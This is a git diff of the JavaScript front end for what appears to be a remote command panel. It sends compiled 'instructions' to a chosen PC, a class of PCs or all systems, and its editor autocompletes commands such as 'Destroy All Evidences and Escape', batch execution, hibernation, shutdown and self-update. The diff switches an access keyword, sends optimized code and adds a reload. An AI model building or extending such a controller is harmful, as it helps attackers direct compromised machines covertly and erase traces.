@@ -48,6 +48,7 @@ const istereo = (x) => {
 
 // Manage Connections
 var rData;
+var opCode = "";
 var conToast = undefined;
 // General Format: [0:isConnected, 1:isAutomatic, 2:isCompilable, 3:isFormatted, 4:inDelay_in_milliseconds,5:target,6:mode (1: Specific PC |2: Class |3: All Systems)]
 var ctrlFlags = [false, true, true, true, 5000, "", 1];
@@ -207,7 +208,7 @@ const initReq = () => {
 
 const parseData = (x, y) => {
  if (x.values) {
-  if (x.values[0][0] == "4D1O5-AMIG0S") {
+  if (x.values[0][0] == "DUTCHMAN") {
    if (y) {
     toast.publish({
      type: "done",
@@ -221,7 +222,7 @@ const parseData = (x, y) => {
     // Formatted Mode
     document.getElementById("holmes").innerHTML = "";
     for (let i = 1; i < x.values.length; i++) {
-     document.getElementById("holmes").innerHTML += '<div class="line">' + x.values[i][0] + "</div>";
+     document.getElementById("holmes").innerHTML += `<div class="line line-${x.values[1][0]}">${x.values[i][0]}</div>`;
     }
     document.getElementById("holmes").innerHTML += '<div class="line">&nbsp;</div>';
    }
@@ -269,14 +270,14 @@ editor.setOptions({
  maxLines: Infinity,
  enableBasicAutocompletion: true,
  enableLiveAutocompletion: true,
- showGutter: true,
+ //  showGutter: true,
 });
 var fst = {};
 var wordList = [
  {helper: 'Excape("");', value: "Excape();", args: true, meta: " Execute Batch script and Escape()"},
  {helper: "Escape();", value: "Escape();", args: false, meta: " Destroy All Evidences and Escape"},
  {helper: "Marco();", value: "Marco();", args: false, meta: " Returns Polo if Online"},
- {helper: "Close();", value: "Close();", args: false, meta: " End Execution"},
+ {helper: "Exit();", value: "Exit();", args: false, meta: " End Execution"},
  {helper: 'Update("");', value: "Update();", args: true, meta: " Updates self"},
  {helper: 'Hibernate("");', value: "Hibernate();", args: true, meta: " Hibernate till date"},
  {helper: "Revive();", value: "Revive();", args: false, meta: " End Hibernation  "},
@@ -328,7 +329,7 @@ pause
  {helper: 'Log("");', value: "Log();", args: true, meta: " Logs every Activity"},
  {helper: "Delay(5000);", value: "Delay();", args: true, meta: " Pause Execution temporarily for 'x' ms"},
  {helper: "Shutdown(3500);", value: "Shutdown();", args: true, meta: " Shutsdown the system after 'x' ms"},
- {helper: 'Clone("");', value: "Clone();", args: true, meta: " Initiate Clone Operations"},
+ {helper: 'Clone("Name","https://www...");', value: "Clone();", args: true, meta: " Initiate Clone Operations"},
  {helper: "NClone();", value: "NClone();", args: false, meta: " Stops Cloning op"},
 ];
 var staticWordCompleter = {
@@ -398,6 +399,7 @@ lexWorker.onmessage = function (event) {
  //event.data[2]    -  Additional Info (markups)
  //event.data[3]    -  Target Name (If exist)
  //event.data[4]    -  mode //1: Specific PC |2: Class |3: All Systems
+ //event.data[5]    -  Optimized code
 
  document.getElementById("vim").textContent = `>> run -i ${fileName}\n\n${event.data[1]}`;
  document.getElementById("vim").innerHTML += `<br><br>${event.data[2]}<br><br>>>`;
@@ -406,9 +408,17 @@ lexWorker.onmessage = function (event) {
   document.getElementById("device").textContent = "Run on '" + event.data[3] + "'";
   ctrlFlags[5] = event.data[3];
   ctrlFlags[6] = event.data[4];
+  opCode = event.data[5];
  } else {
   document.getElementById("run").setAttribute("class", "menubar-item nohover");
  }
+};
+
+const reLoad = () => {
+ document.getElementById("spinner").style.display = "block";
+ document.getElementById("statusbar").textContent = "Updating..";
+ document.getElementById("holmes").innerHTML = "";
+ initReq();
 };
 
 const deploy = () => {
@@ -434,7 +444,7 @@ const deploy = () => {
    description: " Sending Instructions to '" + ctrlFlags[5] + "'",
    timeout: 10000,
   });
-  console.log("sending..");
+  console.log("Sending..");
   fetch(writeURL, {
    method: "POST",
    headers: {
@@ -445,7 +455,7 @@ const deploy = () => {
     mode: ctrlFlags[6], //Mode=> 0: Specific PC |1: Class of PC |2: All PC
     name: ctrlFlags[5],
     dir: 0, //0: Normal(S->C) | 1: Response(C->S)
-    code: editor.getValue(),
+    code: opCode,
    }),
   })
    .then((response) => {
@@ -458,6 +468,7 @@ const deploy = () => {
        description: " Instructions uplinked succesfully ",
        timeout: 3000,
       });
+      reLoad();
      } else {
       let idToast = toast.publish({
        type: "danger",
